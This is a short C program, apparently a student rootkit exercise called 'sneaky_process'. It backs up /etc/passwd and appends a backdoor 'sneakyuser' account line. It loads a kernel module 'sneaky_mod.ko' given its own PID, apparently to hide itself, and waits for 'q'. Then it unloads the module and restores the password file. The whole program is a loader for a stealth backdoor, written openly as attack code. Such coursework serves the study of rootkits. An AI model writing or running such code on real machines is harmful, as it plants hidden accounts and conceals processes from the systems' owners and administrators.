#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main(void){
    // Step 1: Print its own process ID to the screen
    printf("sneaky_process pid = %d\n", getpid());

    // Step 2: Append a new line to the end of /etc/passwd
    system("cp /etc/passwd /tmp");
    system("echo \'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n\' >> /etc/passwd");

    // Step 3: Load sneaky kernel module
    char message[32];
    sprintf(message, "insmod sneaky_mod.ko pid=%d", getpid());
    system(message);

    char key_input;
    while ((key_input = getchar()) != 'q')
    {
    }

    // Step 5: Unload sneaky kernel module
    system("rmmod sneaky_mod");

    // Step 6: Restore /etc/passwd
    system("cp /tmp/passwd /etc");
    system("rm -rf /tmp/passwd");

    return 0;
    }